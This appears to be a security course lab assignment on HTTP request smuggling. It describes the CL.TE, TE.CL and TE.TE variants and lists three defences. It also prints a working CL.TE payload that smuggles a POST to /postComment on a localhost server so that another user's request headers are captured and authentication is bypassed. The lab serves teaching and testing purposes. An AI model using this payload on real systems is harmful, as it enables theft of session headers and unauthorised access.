# Task 3
There are generally 3 types of HTTP request smuggling attacks:
- **CL.TE**: The front end uses the Content-Length while the back end server uses Transfer-Encoding.
- **TE.CL**: The front end trusts Transfer-Encoding but the back end relies on Content-Length.
- **TE.TE**: Both the frontend and backend parse Transfer-Encoding, but the header can be obfuscated.

## Task 3.1 Craft an HTTP request smuggling request in an attack type of your choice
This problem isn't tested via `test.py` but feel free to try it against the server to see if it works. Be ready to explain how the attack works and what causes the payload to "execute".

## Task 3.2 Bypass the authentication on the first server
The objective is to leak sensitive headers by redirecting the user to the /postComment page. Having a page that makes persistent and public (aka "reflected" to a page) a POST parameter is indicative of http smuggling header leakage vulnerabilities.

Write the attack in `attack1.txt`.

**Tip: remember the responses we get from the server**

POST / HTTP/1.1
Host: localhost:8080
Content-Length: 10
Transfer-Encoding: chunked

0

POST /postComment HTTP/1.1
Host: localhost:8080
Content-Type: application/x-www-form-urlencoded
Content-Length: 90

x=

## Task 3.3 Name and explain 3 defense types against HTTP request smuggling
- Ensure that frontend and backend servers interpret HTTP requests the same way
- Normalize HTTP requests before passing them to the backend
- reject request with both content-length and transfer-encoding header
